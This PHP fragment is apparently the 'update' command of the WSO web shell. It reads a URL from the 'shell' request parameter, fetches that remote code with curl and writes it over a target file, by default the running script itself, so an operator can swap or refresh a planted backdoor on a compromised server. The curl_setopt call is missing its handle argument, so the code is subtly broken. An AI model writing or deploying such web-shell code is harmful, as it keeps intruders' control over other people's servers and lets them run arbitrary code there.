<?php
_wsoRegisterCommand('update');
function commandUpdate() {
    $shell = $_REQUEST['shell'];
    $to = isset($_REQUEST['to']) ? $_REQUEST['to'] : PHP_SELF;

    $ch = curl_init($shell);
    curl_setopt(CURLOPT_RETURNTRANSFER, true);
    file_put_contents($to, curl_exec($ch));    
    die;
}